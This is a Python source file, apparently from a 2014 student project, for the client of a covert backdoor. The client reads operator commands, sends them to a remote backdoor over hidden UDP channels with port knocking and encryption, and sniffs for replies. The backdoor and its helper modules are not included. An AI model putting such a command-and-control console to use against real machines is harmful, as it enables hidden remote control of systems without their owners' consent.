# --------------------------------------------------------------------------------------------------------------------
#  SOURCE FILE:		   client.py - A simple UDP client that sends and receives covert messages via a backdoor.
#
#  PROGRAM:		       client
#
#  FUNCTIONS:
#
#  LAST MODIFIED:	   November 27, 2014
#
#  DESIGNERS:	       Slade Solobay & Zach Smoroden
#
#  PROGRAMMERS:        Slade Solobay & Zach Smoroden
#
#  NOTES:
#                      A covert application that uses a combination of covert channels, port knocking, password
#                      authentication and encryption to send and receive commands to and from a backdoor running on
#                      another system.
#
#  OUTPUT: secrets.txt - will be saved in the program root directory.
#
#  USAGE: ./client -d <Destination IP> -p [Destination Port] -b [Source IP] -s [Source Port] -i [Interface]
#
# --------------------------------------------------------------------------------------------------------------------
import sys
from client_utils import*
from client_packet import*
import multiprocessing
import getopt
import datetime


# Parse command line arguments
try:
    opts, args = getopt.getopt(sys.argv[1:], 'd:p:b:s:i:h', ['dest=', 'dport=', 'src=', 'sport=', 'interface=', 'help'])
except getopt.GetoptError:
    usage()
    sys.exit(1)

for opt, arg in opts:
    if opt in ('-h', '--help'):
        usage()
        sys.exit(0)
    elif opt in ('-d', '--dest'):
        packet['dest'] = arg
    elif opt in ('-p', '--dport'):
        packet['dport'] = arg
    elif opt in ('-b', '--src'):
        packet['src'] = arg
    elif opt in ('-s', '--sport'):
        packet['sport'] = arg
    elif opt in ('-i', '--interface'):
        packet['interface'] = arg
    else:
        usage()
        sys.exit(2)

# Did they supply a destination IP?
if not packet['dest']:
    usage()
    sys.exit(2)

# Did they provide a config file?
if os.path.isfile('port_conf') is False:
    usage()
    sys.exit(2)

try:
    with open(FILENAME, 'a') as f:
        f.write(datetime.datetime.now().strftime('Initiated Covert Console -- %I:%M:%S %b %d, %Y\n\n'))
    # Setup filter and start sniffing for replies
    packet_filter = "udp and src host {0}".format(packet['dest'])
    # Our sniff function is blocking so run it in a new process
    sniff_process = multiprocessing.Process(target=sniff_packets, args=(packet_filter, ))
    sniff_process.start()

    # Get commands from user
    while 1:
        packet['cmd'] = raw_input("\nPlease enter a covert command (or type \"quit\"): \n")
        if packet['cmd'] == "quit":
            sniff_process.terminate()
            sys.exit(0)
        send_packet(packet)
# Catch Ctrl+C and other keyboard interrupts
except KeyboardInterrupt:
    sniff_process.terminate()
    sys.exit(1)

